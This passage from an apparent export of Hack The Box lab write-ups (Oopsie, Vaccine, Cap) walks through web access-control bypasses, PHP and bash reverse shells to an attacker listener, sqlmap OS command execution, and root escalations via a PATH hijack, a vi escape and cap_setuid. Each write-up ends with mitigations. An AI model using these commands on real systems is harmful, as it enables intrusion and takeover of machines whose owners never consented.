The rest of the chain (credential in db.php, SUID PATH hijack) are compounding mistakes that wouldn't have mattered without that first door open. The escalation is also a good reminder that SUID binaries are permanently in scope for PATH hijack analysis. If strings on a SUID binary shows a bare command name — cat, find, ls, anything — and you control $PATH, you control what runs as root.
writeups.tldrHtml: Apache box running a repair management web app. Guest login is available but the upload feature is locked behind an authorization check that trusts client-supplied cookies. IDOR on the Accounts page leaks the admin's numeric user ID (34322). Swapping your cookie from user=2233 to user=34322 bypasses the check and exposes the file upload form — no password needed. Upload a PHP reverse shell, trigger it from /uploads/, land as www-data. Read db.php in the webroot for robert:M3g4C0rpUs3r!, SSH in, grab the user flag. A SUID binary (/usr/bin/bugtracker) calls cat without a full path, making it trivially hijackable via PATH manipulation — drop a fake cat in /tmp, prepend /tmp to $PATH, run the binary, get a root shell.

sections.label: Introduction
sections.html:
Oopsie is the second box in HTB's Starting Point track and it's basically a masterclass in "trusting the client is a terrible idea." The web app hands you a guest session cookie and then assumes you'd never dream of editing it. One IDOR plus a cookie tweak later and you've got the admin's file upload form. From there it's classic PHP shell upload → credential reuse → SUID PATH hijack. No CVEs, no exotic exploits — just the application doing exactly what you tell it to, because it never learned to question you.

The attack chain touches three distinct vulnerability classes: broken access control (IDOR + cookie manipulation), insecure file upload, and a SUID binary with an unsafe system() call — a greatest-hits anthology for web pentesting fundamentals.

sections.label: Recon
sections.html:
Port Scan

rustscan -a 10.129.29.145 --ulimit 5000 -b 2000 -t 2000 -- -sV -sC

Two open ports, nothing exotic:

PortServiceVersion
22/tcpSSHOpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcpHTTPApache httpd 2.4.29 (Ubuntu)

SSH is Ubuntu 18.04-era (kernel 4.15.0-76-generic, confirmed later from the shell banner). The web title returned as "Welcome" — nondescript, which usually means there's something worth finding inside.

Web Enumeration

feroxbuster -u http://10.129.29.145/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 50 -x php,html,txt,bak,js,json \
  -s 200,204,301,302,307,401,403,405 -k --no-state

Key discoveries:

URLStatusNotes
/cdn-cgi/login/200Login panel
/cdn-cgi/login/index.php200Same login page
/cdn-cgi/login/admin.php302 → loginAdmin panel (redirects unauthenticated)
/cdn-cgi/login/db.php200Empty response body — suspicious
/uploads/301Directory exists, likely upload destination

The /cdn-cgi/ path is worth a note: in production this path is Cloudflare's namespace. Someone thought it was a clever hiding spot, or just grabbed a template. Either way, feroxbuster found it anyway.

Also ran searchsploit Apache 2.4.29 — nothing useful remotely exploitable without credentials. Dead end confirmed early, time to move on to the application logic.

sections.label: Foothold
sections.html:
Login Panel — Guest Access

Browsing to http://10.129.29.145/cdn-cgi/login/ revealed a login form with a convenient "Login as Guest" link at the bottom. Clicking it set the session cookies:

user=2233
role=guest

The app loaded a "Repair Management System" for MegaCorp Automotive with four navigation items: Account, Branding, Clients, and Uploads.

IDOR — Leaking the Admin Access ID

The Accounts page URL pattern was immediately telling:

/cdn-cgi/login/admin.php?content=accounts&id=2

That id=2 is a sequential integer — the single most reliable thing in web pentesting to try decrementing. Changing it to id=1:

http://10.129.29.145/cdn-cgi/login/admin.php?content=accounts&id=1

Returned the admin account record, leaking:

  • Name: admin
  • Email: (admin email)
  • Access ID: 34322

No authentication required to view someone else's account record. Classic IDOR — the app checked that you were logged in as *a* user, not that you were asking about *your* user.

Cookie Manipulation — Bypassing Upload Authorization

The Uploads page responded with "This action require super admin rights" for the guest session. Testing cookie variations confirmed the check was on the user value, not role:

CookieUploads page result
user=2233; role=guest"This action require super admin rights."
user=2233; role=adminSame block — role alone doesn't matter
user=34322; role=guestUpload form appeared
user=34322; role=adminUpload form appeared

The server was comparing the user cookie value against a database of authorized user IDs for the uploads feature. Since that value came straight from the client cookie with no signature or session binding, swapping it in Firefox DevTools (or Burp) was all it took.

The page still showed "Logged in as Guest" in the navbar — the app's identity display and its authorization check were reading from different sources. A wonderful reminder that authorization bugs don't always announce themselves.

sections.label: Shell and access
sections.html:
PHP Reverse Shell Upload

With the upload form accessible, grabbed Pentest Monkey's PHP reverse shell from /usr/share/webshells/php/php-reverse-shell.php, edited the IP and port, and uploaded it via the Branding Image Uploads form with cookies set to user=34322; role=admin.

The server confirmed: "The file php-reverse-shell.php has been uploaded."

The feroxbuster scan had already revealed /uploads/ — that's where it went. Started a listener:

nc -lvnp 4444

Triggered the shell by browsing to:

http://10.129.29.145/uploads/php-reverse-shell.php
Connection received on 10.129.29.145 53776
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Shell as www-data. Python wasn't on the box (python: not found), so used the classic fallback to get a stable terminal:

/usr/bin/script -qc /bin/bash /dev/null

Not perfect, but it works.

Credential Discovery — db.php

Poked around the webroot looking for config files:

find /var/www/html -type f 2>/dev/null

/var/www/html/cdn-cgi/login/db.php stood out — it had returned an empty response body earlier from feroxbuster, which usually means it's a PHP file with no output (i.e., a pure config include). Reading it:

cat /var/www/html/cdn-cgi/login/db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>

Plaintext database credentials: robert:M3g4C0rpUs3r!

Tried them on SSH immediately — because credential reuse is a law of nature, not just a habit:

ssh robert@10.129.29.145

Worked. Proper shell, stable terminal, full user.

sections.label: Escalation
sections.html:
User Flag

cat /home/robert/user.txt
f2c74ee8db7983851ab2a96a44eb7981

Enumerating for Privilege Escalation

Standard first move — find files owned by unusual groups:

find / -group bugtracker 2>/dev/null
/usr/bin/bugtracker
ls -l /usr/bin/bugtracker
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker

The s in permissions: SUID bit set, owned by root. Running it as robert (who is in the bugtracker group via /etc/group) means it executes with root's privileges regardless of who invoked it.

Ran it to see what it does:

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: abs2
---------------

cat: /root/reports/abs2: No such file or directory

It's calling cat /root/reports/<user_input>. The critical question: is it calling cat with a full path, or relying on $PATH?

strings /usr/bin/bugtracker | grep -E 'cat|reports|system|exec'
system
cat /root/reports/

No full path on cat. It builds the command string with a bare cat and passes it to system(). That means whatever binary is named cat and appears first in $PATH will be executed — with root privileges, because the SUID bit elevated the process before the system() call happened.

sections.label: The full chain
sections.html:
PATH Hijack — SUID Privilege Escalation

The plan: drop a fake cat script in /tmp that spawns a shell, then make sure /tmp is first in $PATH before running the SUID binary.

cd /tmp
echo '/bin/sh' > cat
chmod +x cat
export PATH=/tmp:$PATH
/usr/bin/bugtracker
------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1
---------------

# id
uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)

Root shell. The fake cat was executed by system() inside the SUID process, so uid=0 — even though gid and group memberships still show robert's values (the effective UID was elevated by SUID; the groups weren't).

Root Flag

The fake cat had replaced the real one in $PATH, so reading the flag with just cat in the root shell would recurse into our payload. Two options: call the real binary by full path, or just ls /root first and use a different read method.

/bin/cat /root/root.txt
af13b0bee69f8a877c3faf667f7beacf

sections.label: Rabbit holes
sections.html:
Trying to escalate via role=admin cookie alone: The intuitive first guess after seeing role=guest in the cookie was to change it to role=admin. Tested it. The upload restriction persisted. The authorization check on the server side didn't actually read the role cookie value for the uploads endpoint — only user. Spent a few curl iterations on this before confirming the pattern from the accounts IDOR.

searchsploit on Apache 2.4.29: Went down the CVE rabbit hole looking for an unauthenticated Apache exploit. Nothing applicable — the relevant CVEs (path traversal 2.4.49/50) were for later versions. The application-layer vulnerabilities were always the entry point, not the web server itself.

python pty spawn failing: First instinct after getting the www-data shell was python -c 'import pty; ...' — the standard PTY upgrade. Got python: not found. The box is Ubuntu 18.04 with Python 3 only, and even that required python3. Switched to /usr/bin/script -qc /bin/bash /dev/null which gave a functional shell without the full readline/job control experience, but was stable enough.

sections.label: Mitigations
sections.html:
IDOR on Account Records: The accounts page should validate that the requesting user's session ID matches the id parameter they're querying. A user should only be able to view their own account record. At minimum, sensitive fields (access IDs, internal user identifiers) shouldn't be exposed to authenticated but unprivileged users at all.

Client-Side Cookie Authorization: Session state must never be trusted from the client. The user cookie value should be derived server-side from a cryptographically signed session token (e.g., a proper session ID tied to server-stored state). If a user modifies their cookie, the server should reject the tampered session, not obey it.

Unrestricted File Upload: The upload endpoint accepted any file type, including executable PHP. File uploads should:

  • Validate MIME type server-side (not from Content-Type header alone)
  • Rename uploaded files to strip dangerous extensions
  • Store uploads outside the web root, or configure the upload directory to deny PHP execution (php_flag engine off in .htaccess)

Plaintext Credentials in Source Code: db.php contained a hardcoded database password in cleartext. Credentials should be loaded from environment variables or a secrets manager, never committed to or stored in application source files. File permissions should also prevent web server processes from reading config files unnecessarily.

SUID Binary with Unsafe PATH-Dependent Command: The bugtracker binary called cat via system() without specifying an absolute path. Any SUID binary that calls external commands must:

  • Use absolute paths (/bin/cat)
  • Reset $PATH to a known-safe value before calling system()
  • Or avoid system() entirely in favor of safer alternatives (exec* family with explicit argument arrays)

writeups.takeawayHtml: Authorization in web applications has to live on the server — never in a cookie the user controls. The entire Oopsie attack chain ran on one assumption the developers got wrong: that a client-supplied user value is trustworthy. Fix that one mistake and there's no IDOR, no cookie manipulation, and no path to the upload form. The rest of the chain (credential in db.php, SUID PATH hijack) are compounding mistakes that wouldn't have mattered without that first door open. The escalation is also a good reminder that SUID binaries are permanently in scope for PATH hijack analysis. If strings on a SUID binary shows a bare command name — cat, find, ls, anything — and you control $PATH, you control what runs as root.
writeups.againHtml:
I'd hit the accounts IDOR before even touching the cookie manipulation. The URL pattern (?content=accounts&id=2) is immediately suspicious and decrementing the ID is a two-second test — should have been the first thing tried rather than the second.

For the privesc, I'd run strings on every SUID binary as a first pass before even trying LinPEAS. The bugtracker binary analysis took about 30 seconds and the PATH hijack became immediately obvious. When strings shows system and a bare command name in the same binary, you already have the write-up.

Also worth noting for future boxes: when python isn't available for PTY upgrade, script -qc /bin/bash /dev/null is a reliable fallback. Worth having that in muscle memory.

writeups.title: Vaccine
writeups.summary: Three services, three layers to peel. Anonymous FTP hands you a password-protected ZIP. Crack the ZIP to get PHP source. PHP source has an MD5 hash —…
writeups.takeaway: This box is a clean demonstration of credential chaining: each service exposes just enough information to compromise the next one. FTP hands you the ZIP password's hash target; the ZIP exposes the web password hash; the web login grants access to the SQL injection; the SQL injection reaches the OS; and the OS user's password (found in a hardcoded config) unlocks the sudo rule that hands you root. The critical technical lesson is PostgreSQL DBA privilege. COPY ... FROM PROGRAM is a documented, legitimate feature — but in the context of a SQL-injectable web application, it's an OS command execution primitive. Running web application database connections as superuser is the mistake that turned SQL injection into a full shell. The sudo escalation reinforces a point worth repeating: editors are shells. Any sudoers entry allowing vi, vim, nano, less, more, or their relatives gives the grantee a root shell. The file restriction is theater.
writeups.tldrHtml: Three services, three layers to peel. Anonymous FTP hands you a password-protected ZIP. Crack the ZIP to get PHP source. PHP source has an MD5 hash — crack that too and you have the web admin password. The admin dashboard has a SQLi-vulnerable GET parameter against a PostgreSQL backend running as DBA, so sqlmap --os-shell gets you OS command execution via COPY ... FROM PROGRAM. Upgrade to a proper reverse shell as postgres, find the database password hardcoded in dashboard.php, use it to authenticate sudo -l, discover that postgres can run vi as root against a specific file. GTFOBins makes short work of that — :set shell=/bin/bash + :shell drops a root prompt, and the root flag is one cat away.

sections.label: Introduction
sections.html:
Vaccine is the third box in HTB's Starting Point track, and it introduces a concept that shows up constantly in real engagements: the attacker chain where each service hands you a credential or piece of information that unlocks the next one. FTP → ZIP → PHP source → web login → SQL injection → OS shell → sudo → root. No single step is complicated, but you have to be paying attention to realize you're collecting keys, not just poking random services.

The name "Vaccine" is a bit ironic given that the box's PostgreSQL instance is quite literally injecting things on your behalf. The database is running as a DBA-privileged user with COPY ... FROM PROGRAM enabled — a feature that was designed for data imports and has the side effect of letting you run arbitrary shell commands. As security missteps go, "DBA running the web backend" is one of the classics.

sections.label: Recon
sections.html:
Port Scan

rustscan -a 10.129.29.113 --ulimit 5000 -b 2000 -t 2000 -- -sV -sC

Three open ports:

PortServiceVersion/Notes
21/tcpFTPvsftpd 3.0.3 — anonymous login allowed
22/tcpSSHOpenSSH 8.0p1 Ubuntu
80/tcpHTTPApache 2.4.41 — "MegaCorp Login" page

The FTP anonymous login flag is the immediate priority. Everything else can wait.

Anonymous FTP Enumeration

ftp anonymous@10.129.29.113

Password: anything (blank, anonymous, guest — vsftpd doesn't care when anonymous is enabled).

230 Login successful.
ftp> ls
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
ftp> get backup.zip

backup.zip downloaded. One file, but it turns out to contain everything needed to proceed.

Web Enumeration

The HTTP service on port 80 serves a "MegaCorp Login" page with username and password fields. No guest login option this time — this one wants credentials. Filed that away and went to work on the ZIP.

sections.label: Foothold
sections.html:
Cracking the ZIP Password

The ZIP was password-protected. zip2john turns it into a crackable hash:

zip2john backup.zip > backup.hash
john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
741852963        (backup.zip/index.php)
741852963        (backup.zip/style.css)

Password: 741852963. Not exactly a passphrase designed to withstand scrutiny.

Extracting and Reading the PHP Source

unzip backup.zip
# password: 741852963

Extracted two files: index.php and style.css. The CSS is decorative. The PHP is the treasure:

cat index.php

Relevant section:

if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {

Two things confirmed: the admin username is admin, and the password is validated by comparing its MD5 to 2cb42f8734ea607eefed3b70af13bbd3. MD5 is not a password hashing function — it's a checksum algorithm that John is very happy to reverse given a wordlist.

Cracking the MD5 Hash

echo "2cb42f8734ea607eefed3b70af13bbd3" > md5.hash
john md5.hash --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt
qwerty789        (?)

Admin password: qwerty789. Cracked in seconds. Rockyou continues to be the gift that keeps on giving.

Web Login

http://10.129.29.113/
Username: admin
Password: qwerty789

Logged in. Redirected to dashboard.php — a car catalogue search page for MegaCorp. The search field queries by make/model.

sections.label: Shell and access
sections.html:
SQL Injection Discovery

The search feature used a GET parameter:

http://10.129.29.113/dashboard.php?search=Lazer

That URL parameter is a classic SQLi test candidate. Ran sqlmap with the authenticated session cookie:

sqlmap -u "http://10.129.29.113/dashboard.php?search=Lazer" \
  --cookie="PHPSESSID=[redacted]" \
  --batch --level=1 --risk=1

sqlmap confirmed multiple injection types:

  • Boolean-based blind
  • Error-based
  • Stacked queries
  • Time-based blind

Backend: PostgreSQL. Privilege level: DBA (superuser). That last detail matters — PostgreSQL's COPY ... FROM PROGRAM command is a DBA-only feature that executes shell commands.

OS Shell via sqlmap

sqlmap -u "http://10.129.29.113/dashboard.php?search=Lazer" \
  --cookie="PHPSESSID=[redacted]" \
  --batch --level=1 --risk=1 \
  --os-shell

sqlmap used stacked queries to call COPY ... FROM PROGRAM, dropped a temporary PHP webshell, and presented an interactive prompt:

os-shell>

Quick identity check:

os-shell> whoami
postgres

os-shell> id
uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)

Running as the postgres OS user. The os-shell is functional but non-interactive — no TTY, no job control, no way to run sudo -l with a password prompt. Time to upgrade to a real shell.

Reverse Shell

Started a listener:

nc -lvnp 4444

From the sqlmap os-shell, sent a bash reverse shell:

bash -c 'bash -i >& /dev/tcp/10.10.14.92/4444 0>&1'
Connection received on 10.129.29.113 56342
bash: cannot set terminal process group (995): Inappropriate ioctl for device
bash: no job control in this shell
postgres@vaccine:/var/lib/postgresql/11/main$

Shell caught. Now to make it usable:

python3 -c 'import pty; pty.spawn("/bin/bash")'

Proper PTY. Readline, job control, and — critically — the ability to enter a password at a sudo prompt.

sections.label: Escalation
sections.html:
User Flag

cat /var/lib/postgresql/user.txt
ec9b13ca4d6229cd5cc1e09980965bf7

Finding the PostgreSQL Password

Standard enumeration of web source files:

grep -nEi 'pass|user|postgres|db|connect' /var/www/html/*.php
/var/www/html/dashboard.php:41:    $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");

PostgreSQL connection string hardcoded in dashboard.php. Password: P@s5w0rd!

This is the OS user postgres's sudo password as well — the same account running both the database and the OS session.

sudo Enumeration

sudo -l
[sudo] password for postgres: P@s5w0rd!
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", ...
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

postgres can run vi as any user (including root), restricted to a specific file. The file restriction is irrelevant — vi can spawn a shell from inside itself regardless of what file it opened. GTFOBins documents exactly this.

sections.label: The full chain
sections.html:
Privilege Escalation via vi GTFOBins

sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf

vi opened (with a terminal warning about TERM settings — E558: Terminal entry not found in terminfo — but opened nonetheless). From vi's Normal mode:

:set shell=/bin/bash

This tells vi which binary to use for shell escapes. Then:

:shell

This drops you to a shell with the privileges of the process running vi — which, because of sudo, is root.

root@vaccine:/var/lib/postgresql/11/main#

Root Flag

cd /root
cat root.txt
dd6e058e814260bc70e9bbdef2715849

sections.label: Rabbit holes
sections.html:
sudo -l from the sqlmap os-shell: The first instinct after landing the sqlmap os-shell was to immediately try sudo -l. It returned no output. The sqlmap shell runs commands through PostgreSQL's COPY ... FROM PROGRAM, which lacks a TTY — so any command that requires interactive input (like a password prompt) either hangs silently or produces no output. Wasted a couple of minutes on this before upgrading to a proper reverse shell.

SUID binary enumeration: Ran find / -perm -4000 -type f 2>/dev/null as postgres. The list was long — all standard Ubuntu SUID binaries (mount, su, sudo, gpasswd, etc.), nothing unusual. No custom SUID binary like Oopsie's bugtracker. The escalation path here was always sudo, not SUID.

Trying password guesses before finding dashboard.php: After getting the shell as postgres, spent a moment guessing passwords (postgres, admin, vaccine, the ZIP password) before running the grep against the web source files. Should have just grepped first — config files and PHP source are always the first stop for credential hunting.

vi terminal warning: The E558: Terminal entry not found in terminfo warning when launching vi looked concerning — like vi might not open properly and the GTFOBins escape might fail. In practice, vi still opened (defaulting to ansi terminal mode), and the :set shell + :shell sequence worked without issue. The Escape key displayed as ^[ in the shell, but the colon-prefixed commands still executed. Scary-looking, functionally irrelevant.

sections.label: Mitigations
sections.html:
Anonymous FTP with sensitive files: The FTP service permitted anonymous read access and exposed backup.zip — a file containing application source code with embedded credentials. If FTP is required at all, anonymous access should be disabled. Sensitive backup files should never be accessible to unauthenticated users, regardless of protocol.

Weak ZIP password and MD5 password storage: 741852963 is a sequential keypad pattern and falls in the top 10% of rockyou entries. More critically, the application stored the admin password as a raw MD5 hash. MD5 is cryptographically broken for password storage — use bcrypt, scrypt, or Argon2 with appropriate work factors. The combination of a weak password and a fast hash meant cracking took seconds.

SQL Injection in GET parameter: The search parameter was passed directly into a SQL query with no parameterization. All database queries should use prepared statements with bound parameters. Input validation is a secondary defense, not a substitute for parameterization.

PostgreSQL DBA running the web backend: The web application connected to PostgreSQL as a DBA-privileged superuser. This is what enabled COPY ... FROM PROGRAM for OS command execution. Application database users should be granted only the minimum necessary privileges — SELECT/INSERT/UPDATE/DELETE on their own tables, nothing more. A least-privilege DB user cannot run COPY ... FROM PROGRAM regardless of what SQL injection succeeds.

Hardcoded database credentials in source: dashboard.php contained the full PostgreSQL connection string including the plaintext password. Database credentials belong in environment variables or a secrets manager, not in source code or config files that a shell user can read.

sudo on a shell-capable editor: Granting sudo access to vi, vim, nano, less, more, awk, perl, python, or any other program that can spawn a shell is functionally equivalent to granting a root shell. The file restriction in sudoers (/bin/vi /etc/postgresql/11/main/pg_hba.conf) does not help — the editor itself can spawn a shell regardless of which file it opened. If editing a specific file as root is genuinely required, consider using sudoedit (which invokes the editor with dropped privileges after copying the file) rather than sudo vi.

writeups.takeawayHtml: This box is a clean demonstration of credential chaining: each service exposes just enough information to compromise the next one. FTP hands you the ZIP password's hash target; the ZIP exposes the web password hash; the web login grants access to the SQL injection; the SQL injection reaches the OS; and the OS user's password (found in a hardcoded config) unlocks the sudo rule that hands you root. The critical technical lesson is PostgreSQL DBA privilege. COPY ... FROM PROGRAM is a documented, legitimate feature — but in the context of a SQL-injectable web application, it's an OS command execution primitive. Running web application database connections as superuser is the mistake that turned SQL injection into a full shell. The sudo escalation reinforces a point worth repeating: editors are shells. Any sudoers entry allowing vi, vim, nano, less, more, or their relatives gives the grantee a root shell. The file restriction is theater.
writeups.againHtml:
I'd grep the PHP source files for credentials immediately after landing the shell, before trying anything else. The pattern grep -rEi 'pass|connect|password' /var/www/html/ takes five seconds and would have surfaced P@s5w0rd! before I wasted time trying sudo without a password.

For the sqlmap phase: I'd go straight to --os-shell after confirming the injection type, rather than running additional enumeration queries first. When you have stacked queries in PostgreSQL as DBA, --os-shell is the direct path — there's nothing the SQL enumeration would tell you that a shell couldn't tell you better.

The PTY upgrade step is worth doing immediately after the reverse shell connects — before any other enumeration. python3 -c 'import pty; pty.spawn("/bin/bash")' takes two seconds and makes everything else in the session more reliable. Running sudo without a proper PTY produces the "a terminal is required to read the password" error and wastes time debugging what should be a trivial password entry.

writeups.title: Cap
writeups.summary: The web app ran a "Security Dashboard" that let users trigger network captures. The capture results were stored at /data/<id> with no access controls…
writeups.takeaway: Linux capabilities are quieter than SUID bits and just as dangerous. cap_setuid on an interpreter is essentially a global privilege escalation token for anyone who can run that interpreter. getcap -r / 2>/dev/null should be in every Linux privilege escalation checklist, ideally before SUID enumeration — it's a shorter list and the hits are often more reliable.
writeups.tldrHtml: The web app ran a "Security Dashboard" that let users trigger network captures. The capture results were stored at /data/<id> with no access controls — navigating to /data/0 returned a PCAP from someone else's session. That PCAP captured an FTP session with plaintext credentials (nathan:Buck3tH4TF0RM3!). The same password worked for SSH. On the box, python3.8 had the cap_setuid Linux capability set, which lets any process call setuid(0) — two lines of Python later: root.

sections.label: Introduction
sections.html:
Cap is an HTB Easy box with a deceptively clean attack chain. The entire compromise hinges on two concepts that frequently appear in real engagements: an IDOR (Insecure Direct Object Reference) on a web dashboard exposing other users' data, and Linux capabilities misuse as a privilege escalation vector. Capabilities are often overlooked in favour of SUID hunting, but cap_setuid is arguably more dangerous than most SUID binaries because it lets a binary call setuid(0) without being root itself.

Prerequisites

Readers should know:

  • What an IDOR vulnerability is and how to test for it manually
  • What PCAP files are and basic tshark/Wireshark usage for protocol filtering
  • What Linux capabilities are and how they differ from SUID bits
  • Why cap_setuid is dangerous (it bypasses the normal setuid(0) restriction that requires root privileges)

sections.label: Recon
sections.html:
(~0 mins)

Port Scan

rustscan -a 10.129.171.136 --ulimit 5000 -b 2000 -t 2000 -- -sV -sC
PortServiceVersion / Detail
21/tcpFTPvsftpd 3.0.3
22/tcpSSHOpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcpHTTPGunicorn — "Security Dashboard"

Three services. FTP and SSH both require credentials; the web app is the starting point.

FTP Anonymous — Denied

ftp 10.129.171.136
Name: anonymous
530 Login incorrect.

No anonymous access. Moving to the web app.

Web Recon

The web app is a Python/Gunicorn "Security Dashboard" with three main features accessible from the navbar: Dashboard (general stats), IP Config (/ip), and Network Status (/netstat). A "Security Snapshot" button triggers a network capture and redirects to /data/<id>.

Feroxbuster found the routes cleanly:

feroxbuster -u http://10.129.171.136 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 50 -x php,html,txt,bak,js,json -s 200,204,301,302,307,401,403,405 -k --no-state

Notable finds:

URLNotes
/ipRuns ifconfig, renders output
/netstatRuns netstat, renders output
/captureRedirects to /data/1 (current capture)
/dataRedirects to / — no listing

The /capture → /data/1 redirect is the first hint: the ID is user-controlled.

sections.label: Foothold
sections.html:
(~15 mins)

IDOR on /data/<id>

Browsing to /data/1 returns my own scan result. Browsing to /data/2, /data/3 — same. Trying /data/0:

http://10.129.171.136/data/0

The app returns a download link for 0.pcap — a PCAP file generated before my session began. There is no session check, no ownership validation; the only "access control" is guessing the right integer. This is a textbook IDOR.

PCAP Analysis — FTP Credentials in Plaintext

PCAP="0.pcap"
capinfos "$PCAP"
Number of packets:   4,607
File size:           950 kB
Capture duration:    4.776751 seconds

Checking protocol hierarchy:

tshark -r "$PCAP" -q -z io,phs
tcp                    frames:4607
  http                 frames:2289
    data-text-lines    frames:1144

Pure TCP/HTTP — and data-text-lines means unencrypted content. Filtering for FTP auth commands directly:

tshark -r 0.pcap -Y 'ftp.request.command == "USER" || ftp.request.command == "PASS"'
36  4.126500  192.168.196.1 → 192.168.196.16  FTP  Request: USER nathan
40  5.424998  192.168.196.1 → 192.168.196.16  FTP  Request: PASS Buck3tH4TF0RM3!

Credentials in plaintext, as God and vsftpd intended.

Credentials found:

UsernamePasswordService
nathanBuck3tH4TF0RM3!FTP (and SSH — password reuse)

FTP Login — User Flag

ftp 10.129.171.136
Name: nathan
Password: Buck3tH4TF0RM3!
230 Login successful.
ftp> dir
-r--------    1 1001     1001           33 Oct 15 13:38 user.txt
ftp> get user.txt
cat user.txt
9ef7730201688d94b3b0d7bad7e25fc4

sections.label: Shell and access
sections.html:
(~20 mins)

SSH as nathan

FTP gave the user flag, but an interactive shell is needed for escalation. Password reuse check:

ssh nathan@10.129.171.136
# password: Buck3tH4TF0RM3!
nathan@cap:~$ id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)

No password reuse shame here — it's an HTB box. But in production this would be two findings on the report.

Enumeration

nathan@cap:~$ sudo -l
Sorry, user nathan may not run sudo on cap.

nathan@cap:~$ cat /etc/crontab
# [only standard system cron jobs — nothing useful]

No sudo. Crontab clean. Checking Linux capabilities specifically (often skipped in favour of SUID):

nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep

There it is: /usr/bin/python3.8 has cap_setuid.

sections.label: Escalation
sections.html:
(~22 mins)

cap_setuid on python3.8

What is cap_setuid? Linux capabilities are a fine-grained split of the traditional root privilege set. Normally, only a process running as root (UID 0) can call setuid(0). The cap_setuid capability overrides this restriction — it allows the process to call setuid() with any UID regardless of its current UID. A binary with cap_setuid effective (+e) can therefore change its UID to 0 and spawn a shell as root without any password or SUID bit required.

Confirming the effective bit is set:

nathan@cap:~$ /usr/bin/python3.8 -c 'import os; print(os.getuid(), os.geteuid())'
1001 1001

Both UID and EUID show 1001 — normal. But the capability lets setuid(0) succeed:

nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)

UID is now 0. Root shell.

root@cap:/root# cat root.txt
01beb0effac8620d8cb43840b2f7a25e

sections.label: The full chain
sections.html:
The complete attack chain:

  1. Web IDOR — /data/0 accessible without ownership check → downloaded PCAP from another user's session
  2. PCAP analysis — tshark FTP auth filter → nathan:Buck3tH4TF0RM3! in plaintext
  3. FTP login → user flag
  4. SSH login (password reuse) → interactive shell as nathan
  5. cap_setuid on python3.8 → os.setuid(0) → root shell → root flag

sections.label: Rabbit holes
sections.html:
FTP Anonymous — Hard No

The notes show an immediate anonymous FTP attempt at the start. vsftpd 3.0.3 with anonymous login disabled returns 530 Login incorrect before you can do anything. Nothing to investigate there, no version-specific vulnerability to chase — it's just locked. The PCAP was always the path.

feroxbuster on the PCAP — Noise, Not Signal

The PCAP captured by /data/1 (my own scan) contained feroxbuster's scan traffic — around 4,600 frames of my own HTTP requests. Trying to extract meaningful credentials from that was a waste of time. The content was all 404 responses to wordlist entries. The insight is that the /data/0 PCAP predates my scan and captured someone else's activity — the IDOR is what made it reachable, not web dir brute.

SUID pkexec / PwnKit Temptation

/usr/bin/pkexec shows up in the SUID list, and this is Ubuntu 20.04 (kernel 5.4.0-80) — which is within CVE-2021-4034 (PwnKit) range. On a previous box (Red), PwnKit was the intended path. Here it's a distraction: cap_setuid on python3.8 is two lines and zero compilation. Always enumerate capabilities before reaching for CVEs.

sections.label: Mitigations
sections.html:
VulnerabilitySeverityMitigation
IDOR on /data/<id> — no session-based ownership checkHighValidate that the requesting session owns the requested capture ID; use UUIDs instead of sequential integers to prevent enumeration
FTP credentials captured in cleartext PCAP, accessible to other usersCriticalNever run FTP on production infrastructure; FTP transmits credentials in plaintext by design — use SFTP or FTPS; store captures only accessible to the owning session
Password reuse across FTP and SSHHighEnforce distinct credentials per service; consider SSH key-only authentication and disable password auth entirely
cap_setuid assigned to a general-purpose interpreter (python3.8)CriticalNever assign cap_setuid to scripting interpreters; capabilities on interpreters are functionally equivalent to running those interpreters as root — use a purpose-built binary if a service genuinely requires UID switching

writeups.takeawayHtml: Linux capabilities are quieter than SUID bits and just as dangerous. cap_setuid on an interpreter is essentially a global privilege escalation token for anyone who can run that interpreter. getcap -r / 2>/dev/null should be in every Linux privilege escalation checklist, ideally before SUID enumeration — it's a shorter list and the hits are often more reliable.
writeups.againHtml: Go straight to /data/0 by hand before running any automated scan — sequential integer IDs on a capture endpoint is an obvious IDOR test case. The PCAP analysis itself is a single tshark one-liner once the file is in hand. On the escalation side, run getcap before find -perm -4000; capabilities lists are shorter and more targeted than the pages of SUID output snap packages generate.

writeups.title: Archetype
writeups.summary: An SMB backups share was accessible without credentials and contained a SSIS .dtsConfig file with plaintext SQL Server credentials. The account…
writeups.takeaway: ConsoleHost_history.txt is the Windows equivalent of .bash_history — and people are far less likely to think about clearing it. Any administrator who has typed credentials into a PowerShell prompt has potentially left them in this file, readable by anyone who subsequently compromises that account's session. It should be on every Windows post-exploitation checklist, right after sudo -l equivalents.
